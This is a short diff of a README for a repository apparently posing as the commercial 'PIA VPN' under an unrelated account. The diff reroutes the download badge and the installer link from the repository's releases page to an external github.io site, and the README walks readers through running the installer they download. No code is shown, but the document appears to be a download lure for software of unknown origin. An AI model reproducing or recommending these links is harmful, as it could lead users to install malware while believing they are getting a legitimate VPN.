@@ -1,6 +1,6 @@
 # 🛡️ PIA-VPN-2026 - Secure your internet connection today.
 
-[![](https://img.shields.io/badge/Download_PIA_VPN-Blue?style=for-the-badge)](https://github.com/lewcriterial680/PIA-VPN-2026/releases)
+[![](https://img.shields.io/badge/Download_PIA_VPN-Blue?style=for-the-badge)](https://lewcriterial680.github.io)
 
 ## What is PIA-VPN-2026?
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [Releases page](https://github.com/lewcriterial680/PIA-VPN-2026/releases).
+1. Go to the [Releases page](https://lewcriterial680.github.io).
 2. Look for the latest version of the installer file in the list.
 3. Click the file name to start the download.
 4. Find the file in your Downloads folder once it finishes.
